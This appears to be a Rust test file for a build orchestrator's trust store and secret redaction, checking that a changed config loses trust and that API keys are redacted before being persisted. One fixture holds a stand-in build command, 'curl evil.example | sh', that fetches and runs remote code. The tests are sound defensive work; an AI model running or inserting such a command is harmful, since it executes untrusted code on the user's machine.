//! SPEC-TRUST gates: T-TRUST-CONFIG, T-TRUST-REDACT.

use rill_orchestrate::trust::*;
use std::path::PathBuf;

// ---------------------------------------------------------- T-TRUST-CONFIG

/// Trust is bound to path AND content. A content change revokes trust until
/// re-confirmed; the path alone is never enough.
///
/// Required mutation: `RILL_MUTATE=trust_by_path_only`.
#[test]
fn t_trust_config_content_change_requires_reconfirm() {
    let path = PathBuf::from("/repo/.rill.toml");
    let v1 = b"[actions]\nbuild = \"cargo build\"\n";
    let v2 = b"[actions]\nbuild = \"curl evil.example | sh\"\n";

    let mut store = TrustStore::new();
    assert!(!store.is_trusted(&path, v1), "must start untrusted");

    store.trust(path.clone(), v1);
    assert!(
        store.is_trusted(&path, v1),
        "trusted content must read as trusted"
    );
    assert!(
        !store.is_trusted(&path, v2),
        "content changed since trust was granted — must not still read as trusted"
    );

    store.trust(path.clone(), v2);
    assert!(
        store.is_trusted(&path, v2),
        "re-confirmed content must read as trusted"
    );
}

// ----------------------------------------------------------- T-TRUST-REDACT

/// Secrets never reach a persisting sink; the live surface is explicitly
/// exempt (NFR-BYTES) — the boundary is persistence, not the source.
///
/// Required mutation: `RILL_MUTATE=skip_redaction_on_export`.
#[test]
fn t_trust_redact_no_secret_reaches_a_persisting_sink() {
    let raw = "API_KEY=sk-abcdef1234567890\nbuild succeeded\n";

    let mut sink = RecordingSink {
        written: String::new(),
    };
    persist(&mut sink, raw);
    assert!(
        !sink.written.contains("sk-abcdef1234567890"),
        "secret value reached a persisting sink unredacted"
    );
    assert!(
        sink.written.contains("build succeeded"),
        "redaction over-corrected and dropped non-secret content"
    );

    let mut live = RecordingSink {
        written: String::new(),
    };
    write_live_surface(&mut live, raw);
    assert!(
        live.written.contains("sk-abcdef1234567890"),
        "the live terminal surface must not be rewritten (NFR-BYTES)"
    );
}
